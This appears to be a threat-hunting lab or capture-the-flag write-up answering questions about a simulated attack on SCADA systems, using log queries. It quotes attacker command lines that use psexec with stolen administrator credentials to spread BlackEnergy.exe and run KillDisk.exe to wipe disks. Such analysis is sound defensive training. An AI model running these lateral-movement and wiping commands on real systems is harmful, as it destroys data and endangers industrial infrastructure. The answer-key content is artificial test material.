What is the name of the executable that was used to do wipe data?
Look to the last command run featuring "SCADA": for /F 'tokens=1' %i in (C:\\ProgramData\\SCADA_IPs.txt) do (
  set /p password=<C:\\ProgramData\\Extracted_Password.txt
  psexec.exe \\%i -u administrator -p %password% cmd /c "\\%i\\SCADA\\KillDisk.exe --all --wipe"
)
Answer: KillDisk.exe

What legitimate Windows tool was exploited to carry out these remote executions?
ProcessEvents
| where process_commandline contains "administrator"
The result shows: for /F 'tokens=1' %i in (C:\\ProgramData\\SCADA_IPs.txt) do (
  set /p password=<C:\\ProgramData\\Extracted_Password.txt
  psexec.exe \\%i -u administrator -p %password% cmd /c "copy C:\\malware\\BlackEnergy.exe \\%i\\SCADA\\BlackEnergy.exe"
)
Look right before the credentials; psexec.exe is the command being run.

What executable did the theat actor use to establish persistence and perform reconnaissance on the SCADA systems during the attack?
ProcessEvents
| where process_commandline contains "SCADA" and process_commandline contains ".exe"
The second result shows: for /F 'tokens=1' %i in (C:\\ProgramData\\SCADA_IPs.txt) do (
  set /p password=<C:\\ProgramData\\Extracted_Password.txt
  psexec.exe \\%i -u administrator -p %password% cmd /c "copy C:\\malware\\BlackEnergy.exe \\%i\\SCADA\\BlackEnergy.exe"
)
This answer can be found in towards the end, as well. BlackEnergy.exe is being copied to the SCADA systems and run.

